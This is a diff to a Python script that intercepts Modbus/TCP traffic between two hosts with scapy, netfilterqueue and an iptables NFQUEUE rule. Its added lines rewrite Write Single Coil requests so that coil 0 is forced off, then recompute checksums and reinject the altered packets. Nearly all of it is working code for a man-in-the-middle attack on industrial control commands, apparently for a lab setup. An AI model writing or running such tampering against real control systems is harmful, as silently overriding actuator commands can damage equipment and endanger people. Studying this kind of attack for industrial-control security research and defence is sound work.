@@ -1,5 +1,5 @@
 from scapy.all import *
-import scapy.contrib.modbus as mb
+from scapy.contrib.modbus import *
 from netfilterqueue import NetfilterQueue
 import time
 import argparse
@@ -9,11 +9,19 @@ def packet_callback(packet):
     scapy_packet = IP(payload)
     scapy_datagram = TCP(payload)
 
-    #if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw) and scapy_packet.haslayer(IP):
-    if scapy_packet[IP].src == '10.0.1.66' and scapy_packet[IP].dst == '10.0.0.192':
-        print("dst " + scapy_packet[IP].dst)
-        #print(scapy_packet[Raw].load[6:])
-        #scapy_packet.show()
+    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(IP):
+        if scapy_packet[IP].src == '10.0.1.66' and scapy_packet[IP].dst == '10.0.0.192':
+            if ModbusPDU05WriteSingleCoilRequest in scapy_packet:
+                if scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputAddr == 0:
+                    scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputValue = 0
+                if scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputAddr == 0:
+                    scapy_packet[ModbusPDU05WriteSingleCoilRequest].show()
+
+                del scapy_packet[IP].chksum
+                del scapy_packet[TCP].chksum
+
+                packet.set_payload(bytes(scapy_packet))
+
     packet.accept()
 
 iptablesr1 = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
